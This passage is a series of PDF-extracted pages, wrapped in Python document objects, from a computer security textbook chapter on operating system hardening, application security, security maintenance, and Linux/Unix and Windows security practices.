\\ndefault configuration for many operating systems often maximizes ease of use and \\nfunctionality, rather than security. Further, since every organization has its own secu-\\nrity needs, the appropriate security profile, and hence configuration, will also differ. \\nWhat is required for a particular system should be identified during the planning \\nphase, as we have just discussed.\\nM12_STAL0611_04_GE_C12.indd   422 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 424, 'page_label': '423'}, page_content='12.3 / OPERATing SySTEmS HARDEning  423\\nWhile the details of how to secure each specific operating system differ, the \\nbroad approach is similar. Appropriate security configuration guides and checklists \\nexist for most common operating systems, and these should be consulted, though \\nalways informed by the specific needs of each organization and their systems. In \\nsome cases, automated tools may be available to further assist in securing the system \\nconfiguration.\\nNIST SP 800-123 suggests the following basic steps that should be used to \\nsecure an operating system:\\n• Install and patch the operating system.\\n• Harden and configure the operating system to adequately address the identified \\nsecurity needs of the system by:\\n• Removing unnecessary services, applications, and protocols.\\n• Configuring users, groups, and permissions.\\n• Configuring resource controls.\\n• Install and configure additional security controls, such as anti-virus, host-based \\nfirewalls, and intrusion detection systems (IDS), if needed.\\n• Test the security of the basic oper ating system to ensure that the steps taken \\nadequately address its security needs.\\nOperating System Installation: Initial Setup and Patching\\nSystem security begins with the installation of the operating system. As we have \\nalready noted, a network connected, unpatched system, is vulnerable to exploit during \\nits installation or continued use. Hence, it is important that the system not be exposed \\nwhile in this vulnerable state. Ideally, new systems should be constructed on a pro -\\ntected network. This may be a completely isolated network, with the operating system \\nimage and all available patches transferred to it using removable media such as DVDs \\nor USB drives. Given the existence of malware that can propagate using removable \\nmedia, as we discussed in Chapter 6, care is needed to ensure the media used here is \\nnot so infected. Alternatively, a network with severely restricted access to the wider \\nInternet may be used. Ideally, it should have no inbound access, and have outbound \\naccess only to the key sites needed for the system installation and patching process. \\nIn either case, the full installation and hardening process should occur before the \\nsystem is deployed to its intended, more accessible, and hence vulnerable, location.\\nThe initial installation should install the minimum necessary for the desired \\nsystem, with additional software packages included only if they are required for the \\nfunction of the system. We explore the rationale for minimizing the number of pack-\\nages on the system shortly.\\nThe overall boot process must also be secured. This may require adjusting \\noptions on, or specifying a password required for changes to, the BIOS code used \\nwhen the system initially boots. It may also require limiting from which media the \\nsystem is normally permitted to boot. This is necessary to prevent an attacker from \\nchanging the boot process to install a covert hypervisor, such as we discussed in Sec-\\ntion 6.8, or to just boot a system of their choice from external media in order to bypass \\nthe normal system access controls on locally stored data. The use of a cryptographic \\nfile system may also be used to address this threat, as we will note later.\\nM12_STAL0611_04_GE_C12.indd   423 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 425, 'page_label': '424'}, page_content='424  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nCare is also required with the selection and installation of any additional device \\ndriver code, since this executes with full kernel level privileges, but is often supplied \\nby a third party. The integrity and source of such driver code must be carefully vali-\\ndated given the high level of trust it has. A malicious driver can potentially bypass \\nmany security controls to install malware. This was done in both the Blue Pill dem -\\nonstration rootkit, which we discussed in Section 6.8, and the Stuxnet worm, which \\nwe described in Section 6.3.\\nGiven the continuing discovery of software and other vulnerabilities for com -\\nmonly used operating systems and applications, it is critical that the system be kept as \\nup to date as possible, with all critical security related patches installed. Indeed, doing \\nthis addresses one of the top four key ASD mitigation strategies we listed previously. \\nNearly, all commonly used systems now provide utilities that can automatically down-\\nload and install security updates. These tools should be configured and used to minimize \\nthe time any system is vulnerable to weaknesses for which patches are available.\\nOn change-controlled systems, there can be a perception that running automatic \\nupdates may be detrimental, as they may on rare but significant occasions, introduce \\ninstability. However, ASD notes, that the delay in testing patches can leave systems \\nvulnerable to compromise, and that they believe automatic update is preferable. For \\nsystems on which availability and uptime are of paramount importance, you may need \\nto stage and validate all patches on test systems before deploying them in production. \\nHowever, this process should be as timely as possible.\\nRemove Unnecessary Services, Application, and Protocols\\nBecause any of the software packages running on a system may contain software \\nvulnerabilities, clearly if fewer software packages are available to run, then the risk is \\nreduced. There is clearly a balance between usability, providing all software that may \\nbe required at some time, with security, and a desire to limit the amount of software \\ninstalled. The range of services, applications, and protocols required will vary widely \\nbetween organizations, and indeed between systems within an organization. The sys-\\ntem planning process should identify what is actually required for a given system, \\nso a suitable level of functionality is provided, while eliminating software that is not \\nrequired to improve security.\\nThe default configuration for most distributed systems is set to maximize ease \\nof use and functionality, rather than security. When performing the initial installation, \\nthe supplied defaults should not be used, but rather the installation should be custom-\\nized so only the required packages are installed. If additional packages are needed \\nlater, they can be installed when they are required. NIST SP 800-123 and many of the \\nsecurity hardening guides provide lists of services, applications, and protocols that \\nshould not be installed if not required.\\nNIST SP 800-123 also states a strong preference for not installing unwanted \\nsoftware, rather than installing then later removing or disabling it. It argues this pref-\\nerence because they note that many uninstall scripts fail to completely remove all \\ncomponents of a package. They also note that disabling a service means that while it is \\nnot available as an initial point of attack, should an attacker succeed in gaining some \\naccess to a system, then disabled software could be re-enabled and used to further \\ncompromise a system. It is better for security if unwanted software is not installed, \\nand thus not available for use at all.\\nM12_STAL0611_04_GE_C12.indd   424 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 426, 'page_label': '425'}, page_content='12.3 / OPERATing SySTEmS HARDEning  425\\nConfigure Users, Groups, and Authentication\\nNot all users with access to a system will have the same access to all data and resources \\non that system. All modern operating systems implement access controls to data and \\nresources, as we discussed in Chapter 4. Nearly, all provide some form of discretionary \\naccess controls. Some systems may provide role-based or mandatory access control \\nmechanisms as well.\\nThe system planning process should consider the categories of users on the \\n system, the privileges they have, the types of information they can access, and how \\nand where they are defined and authenticated. Some users will have elevated privi-\\nleges to administer the system; others will be normal users, sharing appropriate access \\nto files and other data as required; and there may even be guest accounts with very \\nlimited access. The last of the four key ASD mitigation strategies is to restrict elevated \\nprivileges to only those users that require them. Further, it is highly desirable that \\nsuch users only access elevated privileges when needed to perform some task that \\nrequires them, and to otherwise access the system as a normal user. This improves \\nsecurity by providing a smaller window of opportunity for an attacker to exploit the \\nactions of such privileged users. Some operating systems provide special tools or \\naccess mechanisms to assist administrative users to elevate their privileges only when \\nnecessary, and to appropriately log these actions.\\nOne key decision is whether the users, the groups they belong to, and their \\nauthentication methods are specified locally on the system or will use a centralized \\nauthentication server. Whichever is chosen, the appropriate details are now config-\\nured on the system.\\nAlso at this stage, any default accounts included as part of the system installa-\\ntion should be secured. Those which are not required should be either removed or \\nat least disabled. System accounts that manage services on the system should be set \\nso they cannot be used for interactive logins. And any passwords installed by default \\nshould be changed to new values with appropriate security.\\nAny policy that applies to authentication credentials, and especially to password \\nsecurity, is also configured. This includes details of which authentication methods \\nare accepted for different methods of account access. And it includes details of the \\nrequired length, complexity, and age allowed for passwords. We discussed some of \\nthese issues in Chapter 3.\\nConfigure Resource Controls\\nOnce the users and their associated groups are defined, appropriate permissions can \\nbe set on data and resources to match the specified policy. This may be to limit which \\nusers can execute some programs, especially those that modify the system state. Or \\nit may be to limit which users can read or write data in certain directory trees. Many \\nof the security hardening guides provide lists of recommended changes to the default \\naccess configuration to improve security.\\nInstall Additional Security Controls\\nFurther security improvement may be possible by installing and configuring addi -\\ntional security tools such as antivirus software, host-based firewalls, IDS or IPS \\nsoftware, or application white-listing. Some of these may be supplied as part of the \\nM12_STAL0611_04_GE_C12.indd   425 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 427, 'page_label': '426'}, page_content='426  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\noperating systems installation, but not configured and enabled by default. Others are \\nthird-party products that are acquired and used.\\nGiven the widespread prevalence of malware, as we discussed in Chapter 6, \\nappropriate anti-virus (which as noted addresses a wide range of malware types) is a \\ncritical security component on many systems. Anti-virus products have traditionally \\nbeen used on Windows systems, since their high use made them a preferred target for \\nattackers. However, the growth in other platforms, particularly smartphones, has led \\nto more malware being developed for them. Hence, appropriate anti-virus products \\nshould be considered for any system as part of its security profile.\\nHost-based firewalls, IDS, and IPS software also may improve security by lim-\\niting remote network access to services on the system. If remote access to a service \\nis not required, though some local access is, then such restrictions help secure such \\nservices from remote exploit by an attacker. Firewalls are traditionally configured to \\nlimit access by port or protocol, from some or all external systems. Some may also \\nbe configured to allow access from or to specific programs on the systems, to further \\nrestrict the points of attack, and to prevent an attacker installing and accessing their \\nown malware. IDS and IPS software may include additional mechanisms such as \\ntraffic monitoring, or file integrity checking to identify and even respond to some \\ntypes of attack.\\nAnother additional control is to white-list applications. This limits the programs \\nthat can execute on the system to just those in an explicit list. Such a tool can prevent \\nan attacker installing and running their own malware, and is the first of the four key \\nASD mitigation strategies. While this will improve security, it functions best in an \\nenvironment with a predictable set of applications that users require. Any change \\nin software usage would require a change in the configuration, which may result in \\nincreased IT support demands. Not all organizations or all systems will be sufficiently \\npredictable to suit this type of control.\\nTest the System Security\\nThe final step in the process of initially securing the base operating system is secu -\\nrity testing. The goal is to ensure that the previous security configuration steps are \\ncorrectly implemented, and to identify any possible vulnerabilities that must be cor-\\nrected or managed.\\nSuitable checklists are included in many security hardening guides. There are \\nalso programs specifically designed to review a system to ensure that a system meets \\nthe basic security requirements, and to scan for known vulnerabilities and poor \\nconfiguration practices. This should be done following the initial hardening of the \\nsystem, and then repeated periodically as part of the security maintenance process.\\n 12.4 APPLICATION SECURITY\\nOnce the base operating system is installed and appropriately secured, the required \\nservices and applications must next be installed and configured. The steps for this \\nvery much mirror the list already given in the previous section. The concern, as with \\nthe base operating system, is to only install software on the system that is required to \\nM12_STAL0611_04_GE_C12.indd   426 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 428, 'page_label': '427'}, page_content='12.4 / APPLiCATiOn SECuRiTy  427\\nmeet its desired functionality, in order to reduce the number of places vulnerabilities \\nmay be found. On client systems, software such as Java, PDF viewers, Flash, Web \\nbrowsers, and Microsoft Office are known targets and need to be secured. On server \\nsystems, software that provides remote access or service, including Web, database, and \\nfile access servers, is of particular concern, since an attacker may be able to exploit \\nthis to gain remote access to the system.\\nEach selected service or application must be installed, configured, and then \\npatched to the most recent supported secure version appropriate for the system. This \\nmay be from additional packages provided with the operating system distribution, or \\nfrom a separate third-party package. As with the base operating system, utilizing an \\nisolated, secure build network is preferred.\\nApplication Configuration\\nAny application specific configuration is then performed. This may include creating \\nand specifying appropriate data storage areas for the application, and making appro-\\npriate changes to the application or service default configuration details.\\nSome applications or services may include default data, scripts, or user accounts. \\nThese should be reviewed, and only retained if required, and suitably secured. A well-\\nknown example of this is found with Web servers, which often include a number of \\nexample scripts, quite a few of which are known to be insecure. These should not be \\nused as supplied, but should be removed unless needed and secured.\\nAs part of the configuration process, careful consideration should be given to \\nthe access rights granted to the application. Again, this is of particular concern with \\nremotely accessed services, such as Web and file transfer services. The server applica-\\ntion should not be granted the right to modify files, unless that function is specifically \\nrequired. A very common configuration fault seen with Web and file transfer servers \\nis for all the files supplied by the service to be owned by the same “user” account \\nthat the server executes as. The consequence is that any attacker able to exploit some \\nvulnerability in either the server software or a script executed by the server may be \\nable to modify any of these files. The large number of “Web defacement” attacks \\nis clear evidence of this type of insecure configuration. Much of the risk from this \\nform of attack is reduced by ensuring that most of the files can only be read, but not \\nwritten, by the server. Only those files that need to be modified, to store uploaded \\nform data for example, or logging details, should be writeable by the server. Instead \\nthe files should mostly be owned and modified by the users on the system who are \\nresponsible for maintaining the information.\\nEncryption Technology\\nEncryption is a key enabling technology that may be used to secure data both in \\ntransit and when stored, as we discussed in Chapter 2 and in Parts Four and Five. \\nIf such technologies are required for the system, then they must be configured, and \\nappropriate cryptographic keys created, signed, and secured.\\nIf secure network services are provided, most likely using either TLS or IPsec, \\nthen suitable public and private keys must be generated for each of them. Then X.509 \\ncertificates are created and signed by a suitable certificate authority, linking each \\nservice identity with the public key in use, as we will discuss in Section 23.2. If\\xa0secure \\nM12_STAL0611_04_GE_C12.indd   427 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 429, 'page_label': '428'}, page_content='428  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nremote access is provided using Secure Shell (SSH), then appropriate server, and \\npossibly client keys, must be created.\\nCryptographic file systems are another use of encryption. If desired, then these \\nmust be created and secured with suitable keys.\\n 12.5 SECURITY MAINTENANCE\\nOnce the system is appropriately built, secured, and deployed, the process of main-\\ntaining security is continuous. This results from the constantly changing environ -\\nment, the discovery of new vulnerabilities, and hence exposure to new threats. NIST \\nSP 800-123 suggests that this process of security maintenance includes the following \\nadditional steps:\\n• Monitoring and analyzing logging information\\n• Performing regular backups\\n• Recovering from security compromises\\n• Regularly testing system security\\n• Using appropriate software maintenance processes to patch and update all criti-\\ncal software, and to monitor and revise configuration as needed\\nWe have already noted the need to configure automatic patching and update where \\npossible, or to have a timely process to manually test and install patches on high \\navailability systems, and that the system should be regularly tested using checklist or \\nautomated tools where possible. We will discuss the process of incident response in \\n Section 17 .4. We now consider the critical logging and backup procedures.\\nLogging\\nNIST SP 800-123 notes that “logging is a cornerstone of a sound security posture.” \\nLogging is a reactive control that can only inform you about bad things that have \\nalready happened. But effective logging helps ensure that in the event of a system \\nbreach or failure, system administrators can more quickly and accurately identify \\nwhat happened and thus most effectively focus their remediation and recovery \\nefforts. The key is to ensure you capture the correct data in the logs, and are then \\nable to appropriately monitor and analyze this data. Logging information can be gen-\\nerated by the system, network, and applications. The range of logging data acquired \\nshould be determined during the system planning stage, as it depends on the security \\nrequirements and information sensitivity of the server.\\nLogging can generate significant volumes of information. It is important that \\nsufficient space is allocated for them. A suitable automatic log rotation and archive \\nsystem should also be configured to assist in managing the overall size of the logging \\ninformation.\\nManual analysis of logs is tedious and is not a reliable means of detecting \\nadverse events. Rather, some form of automated analysis is preferred, as it is more \\nlikely to identify abnormal activity. Intrusion Detection Systems, such as those we \\ndiscuss in Chapter 8, perform such automated analysis.\\nWe will discuss the process of logging further in Chapter 18.\\nM12_STAL0611_04_GE_C12.indd   428 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 430, 'page_label': '429'}, page_content='12.6 / LinuX/uniX SECuRiTy  429\\nData Backup and Archive\\nPerforming regular backups of data on a system is another critical control that assists \\nwith maintaining the integrity of the system and user data. There are many reasons \\nwhy data can be lost from a system, including hardware or software failures, or acci-\\ndental or deliberate corruption. There may also be legal or operational requirements \\nfor the retention of data. Backup is the process of making copies of data at regular \\nintervals, allowing the recovery of lost or corrupted data over relatively short time \\nperiods of a few hours to some weeks. Archive is the process of retaining copies of \\ndata over extended periods of time, being months or years, in order to meet legal and \\noperational requirements to access past data. These processes are often linked and \\nmanaged together, although they do address distinct needs.\\nThe needs and policy relating to backup and archive should be determined \\nduring the system planning stage. Key decisions include whether the backup copies \\nare kept online or offline, and whether copies are stored locally or transported to a \\nremote site. The trade-offs include ease of implementation and cost versus greater \\nsecurity and robustness against different threats.\\nA good example of the consequences of poor choices here was seen in the \\nattack on an Australian hosting provider in early 2011. The attackers destroyed not \\nonly the live copies of thousands of customer’s sites, but also all of the online backup \\ncopies. As a result, many customers who had not kept their own backup copies lost \\nall of their site content and data, with serious consequences for many of them, and \\nfor the hosting provider as well. In other examples, many organizations that only \\nretained onsite backups have lost all their data as a result of fire or flooding in their \\nIT center. These risks must be appropriately evaluated.\\n 12.6 LINUX/UNIX SECURITY\\nHaving discussed the process of enhancing security in operating systems through \\ncareful installation, configuration, and management, we now consider some specific \\naspects of this process as it relates to Unix and Linux systems. Beyond the general \\nguidance in this section, we will provide a more detailed discussion of Linux security \\nmechanisms in Chapter 25.\\nThere are a large range of resources available to assist administrators of these \\nsystems, including many texts, for example [NEME10], online resources such as the \\n“Linux Documentation Project,” and specific system hardening guides such as those \\nprovided by the “NSA—Security Configuration Guides.” These resources should be \\nused as part of the system security planning process in order to incorporate proce -\\ndures appropriate to the security requirements identified for the system.\\nPatch Management\\nEnsuring that system and application code is kept up to date with security patches is \\na widely recognized and critical control for maintaining security.\\nModern Unix and Linux distributions typically include tools for automatically \\ndownloading and installing software updates, including security updates, which can \\nminimize the time a system is vulnerable to known vulnerabilities for which patches \\nM12_STAL0611_04_GE_C12.indd   429 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 431, 'page_label': '430'}, page_content='430  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nexist. For example, Red Hat, Fedora, and CentOS include up2date or yum; SuSE \\nincludes yast; and Debian uses apt-get, though you must run it as a cron job for \\nautomatic updates. It is important to configure whichever update tool is provided on \\nthe distribution in use, to install at least critical security patches in a timely manner.\\nAs noted earlier, high availability systems that do not run automatic updates, \\nas they may possibly introduce instability, should validate all patches on test systems \\nbefore deploying them to production systems.\\nApplication and Service Configuration\\nConfiguration of applications and services on Unix and Linux systems is most com-\\nmonly implemented using separate text files for each application and service. System-\\nwide configuration details are generally located either in the “ /etc” directory or \\nin the installation tree for a specific application. Where appropriate, individual user \\nconfigurations that can override the system defaults are located in hidden “dot” files \\nin each user’s home directory. The name, format, and usage of these files are very \\nmuch dependent on the particular system version and applications in use. Hence, the \\nsystems administrators responsible for the secure configuration of such a system must \\nbe suitably trained and familiar with them.\\nTraditionally, these files were individually edited using a text editor, with any \\nchanges made taking effect either when the system was next rebooted or when the \\nrelevant process was sent a signal indicating that it should reload its configuration \\nsettings. Current systems often provide a GUI interface to these configuration files to \\nease management for novice administrators. Using such a manager may be appropri-\\nate for small sites with a limited number of systems. Organizations with larger num-\\nbers of systems may instead employ some form of centralized management, with a \\ncentral repository of critical configuration files that can be automatically customized \\nand distributed to the systems they manage.\\nThe most important changes needed to improve system security are to dis -\\nable services, especially remotely accessible services, and applications, that are not \\nrequired, and to then ensure that applications and services that are needed are appro-\\npriately configured, following the relevant security guidance for each. We will provide \\nfurther details on this in Section 25.5.\\nUsers, Groups, and Permissions\\nAs we describe in Sections 4.4 and 25.3, Unix and Linux systems implement discre-\\ntionary access control to all file system resources. These include not only files and \\ndirectories but also devices, processes, memory, and indeed most system resources. \\nAccess is specified as granting read, write, and execute permissions to each of owner, \\ngroup, and others, for each resource, as shown in Figure 4.5. These are set using the \\nchmod command. Some systems also support extended file attributes with access \\ncontrol lists that provide more flexibility, by specifying these permissions for each \\nentry in a list of users and groups. These extended access rights are typically set and \\ndisplayed using the getfacl and setfacl commands. These commands can also \\nbe used to specify set user or set group permissions on the resource.\\nInformation on user accounts and group membership are traditionally stored \\nin the /etc/passwd and /etc/group files, though modern systems also have the \\nM12_STAL0611_04_GE_C12.indd   430 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 432, 'page_label': '431'}, page_content='12.6 / LinuX/uniX SECuRiTy  431\\nability to import these details from external repositories queried using LDAP or NIS \\nfor example. These sources of information, and indeed of any associated authentica-\\ntion credentials, are specified in the PAM (pluggable authentication module) configu-\\nration for the system, often using text files in the /etc/pam.d directory.\\nIn order to partition access to information and resources on the system, users \\nneed to be assigned to appropriate groups granting them any required access. The \\nnumber and assignments to groups should be decided during the system security \\nplanning process, and then configured in the appropriate information repository, \\nwhether locally using the configuration files in /etc, or on some centralized data -\\nbase. At this time, any default or generic users supplied with the system should be \\nchecked, and removed if not required. Other accounts that are required, but are not \\nassociated with a user that needs to login, should have login capability disabled, and \\nany associated password or authentication credential removed.\\nGuides to hardening Unix and Linux systems also often recommend changing \\nthe access permissions for critical directories and files, in order to further limit access \\nto them. Programs that set user (setuid) to root or set group (setgid) to a privileged \\ngroup are key target for attackers. As we discuss in detail in Sections 4.4 and 25.3, \\nsuch programs execute with superuser rights, or with access to resources belonging to \\nthe privileged group, no matter which user executes them. A software vulnerability \\nin such a program can potentially be exploited by an attacker to gain these elevated \\nprivileges. This is known as a local exploit. A software vulnerability in a network \\nserver could be triggered by a remote attacker. This is known as a remote exploit.\\nIt is widely accepted that the number and size of setuid root programs in par -\\nticular should be minimized. They cannot be eliminated, as superuser privileges are \\nrequired to access some resources on the system. The programs that manage user \\nlogin, and allow network services to bind to privileged ports, are examples. However, \\nother programs, that were once setuid root for programmer convenience, can function \\nas well if made setgid to a suitable privileged group that has the necessary access to \\nsome resource. Programs to display system state, or deliver mail, have been modified \\nin this way. System hardening guides may recommend further changes, and indeed \\nthe removal of some such programs that are not required on a particular system.\\nRemote Access Controls\\nGiven that remote exploits are of concern, it is important to limit access to only \\nthose services required. This function may be provided by a perimeter firewall, as \\nwe discussed in Chapter 9. However, host-based firewall or network access control \\nmechanisms may provide additional defences. Unix and Linux systems support sev-\\neral alternatives for this.\\nThe TCP Wrappers library and tcpd daemon provide one mechanism that net-\\nwork servers may use. Lightly loaded services may be “wrapped” using tcpd, which \\nlistens for connection requests on their behalf. It checks that any request is permitted \\nby configured policy before accepting it and invoking the server program to handle \\nit. Requests that are rejected are logged. More complex and heavily loaded servers \\nincorporate this functionality into their own connection management code, using the \\nTCP Wrappers library, and the same policy configuration files. These files are /etc \\n/hosts.allow and /etc/hosts.deny, which should be set as policy requires.\\nM12_STAL0611_04_GE_C12.indd   431 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 433, 'page_label': '432'}, page_content='432  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nThere are several host firewall programs that may be used. Linux systems pri-\\nmarily use the iptables program to configure the netfilter kernel module. \\nThis provides comprehensive, though complex, stateful packet filtering, monitoring, \\nand modification capabilities. BSD-based systems (including MacOS) now use the \\npf program with similar capabilities. Most systems provide an administrative utility \\nto generate common configurations and to select which services will be permitted to \\naccess the system. These should be used unless there are non-standard requirements, \\ngiven the skill and knowledge needed to run these programs to edit their configura-\\ntion files.\\nLogging and Log Rotation\\nMost applications can be configured to log with levels of detail ranging from “debug-\\nging” (maximum detail) to “none.” Some middle setting is usually the best choice, but \\nyou should not assume that the default setting is necessarily appropriate.\\nIn addition, many applications allow you to specify either a dedicated file to \\nwrite application event data to, or a syslog facility to use when writing log data to \\n/dev/log (see Section 25.5). If you wish to handle system logs in a consistent, \\ncentralized manner, it is usually preferable for applications to send their log data \\nto /dev/log. Note, however, that logrotate (also discussed in Section 25.5) \\ncan be configured to rotate any logs on the system, whether written by syslogd, \\nSyslog-NG, or individual applications.\\nApplication Security Using a chroot jail\\nSome network accessible services do not require access to the full file-system, but \\nrather only need a limited set of data files and directories for their operation. FTP is \\na common example of such a service. It provides the ability to download files from, \\nand upload files to, a specified directory tree. If such a server were compromised and \\nhad access to the entire system, an attacker could potentially access and compromise \\ndata elsewhere. Unix and Linux systems provide a mechanism to run such services \\nin a chroot jail, which restricts the server’s view of the file system to just a specified \\nportion. This is done using the chroot system call that confines a process to some \\nsubset of the file system by mapping the root of the filesystem “/” to some other \\ndirectory (e.g., /srv/ftp/public). To the “chrooted” server, everything in this \\nchroot jail appears to actually be in / (e.g., the “real” directory /srv/ftp/public/\\netc/myconfigfile appears as /etc/myconfigfile in the chroot jail). Files in \\ndirectories outside the chroot jail (e.g., /srv/www or /etc. ) are not visible or \\nreachable at all.\\nChrooting therefore helps contain the effects of a given server being compro -\\nmised or hijacked. The main disadvantage of this method is added complexity: a \\nnumber of files (including all executable libraries used by the server), directories, and \\ndevices needed must be copied into the chroot jail. Determining just what needs to go \\ninto the jail for the server to work properly can be tricky, though detailed procedures \\nfor chrooting many different applications are available.\\nTroubleshooting a chrooted application can also be difficult. Even if an appli-\\ncation explicitly supports this feature, it may behave in unexpected ways when run \\nchrooted. Note also that if the chrooted process runs as root, it can “break out” of \\nM12_STAL0611_04_GE_C12.indd   432 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 434, 'page_label': '433'}, page_content='12.7 / WinDOWS SECuRiTy  433\\nthe chroot jail with little difficulty. Still, the advantages usually far outweigh the dis-\\nadvantages of chrooting network services.\\nSecurity Testing\\nThe system hardening guides such as those provided by the “NSA—Security Configu-\\nration Guides” include security checklists for a number of Unix and Linux distribu-\\ntions that may be followed.\\nThere are also a number of commercial and open-source tools available to \\nperform system security scanning and vulnerability testing. One of the best known is \\n“Nessus.” This was originally an open-source tool, which was commercialized in 2005, \\nthough some limited free-use versions are available. “Tripwire” is a well-known file \\nintegrity checking tool that maintains a database of cryptographic hashes of moni -\\ntored files, and scans to detect any changes, whether as a result of malicious attack, \\nor simply accidental or incorrectly managed update. This again was originally an \\nopen-source tool, which now has both commercial and free variants available. The \\n“Nmap” network scanner is another well-known and deployed assessment tool that \\nfocuses on identifying and profiling hosts on the target network, and the network \\nservices they offer.\\n 12.7 WINDOWS SECURITY\\nWe now consider some specific issues with the secure installation, configuration, \\nand management of Microsoft Windows systems. These systems have for many years \\nformed a significant portion of all “general purpose” system installations. Hence, they \\nhave been specifically targeted by attackers, and consequently security countermea-\\nsures are needed to deal with these challenges. The process of providing appropriate \\nlevels of security still follows the general outline we describe in this chapter. Beyond \\nthe general guidance in this section, we will provide more detailed discussion of \\nWindows security mechanisms in Chapter 26.\\nAgain, there are a large range of resources available to assist administrators \\nof these systems, including online resources such as the “Microsoft Security Tools\\xa0& \\nChecklists,” and specific system hardening guides such as those provided by the \\n“NSA—Security Configuration Guides.”\\nPatch Management\\nThe “Windows Update” service and the “Windows Server Update Services” assist \\nwith the regular maintenance of Microsoft software, and should be configured and \\nused. Many other third-party applications also provide automatic update support, \\nand these should be enabled for selected applications.\\nUsers Administration and Access Controls\\nUsers and groups in Windows systems are defined with a Security ID 